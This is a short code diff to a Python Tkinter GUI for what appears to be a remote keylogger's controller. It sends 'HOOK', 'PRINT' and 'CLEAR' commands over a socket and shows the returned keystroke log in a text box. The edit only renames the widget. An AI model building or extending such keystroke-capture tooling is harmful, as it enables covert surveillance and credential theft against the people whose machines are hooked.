@@ -228,7 +228,6 @@ class GUI:
 
         key_window = tk.Tk()
         key_window.title("Keystroke Log")
-        self.textbox = tk.Text(self)
 
         def hook_click():
             self.client.Cli_Sock.send("HOOK".encode()) # Send the command to the server
@@ -240,11 +239,11 @@ class GUI:
             self.client.Cli_Sock.send("PRINT".encode())
             data = self.client.Cli_Sock.recv(5000).decode()
             print (data)
-            self.textbox.insert(tk.END, data)
+            self.txtKQ.insert(tk.END, data)
 
         def delete_click():
             self.client.Cli_Sock.send("CLEAR".encode())
-            self.textbox.delete("1.0", tk.END)
+            self.txtKQ.delete("1.0", tk.END)
             
         # Buttons
         hook_button = tk.Button(
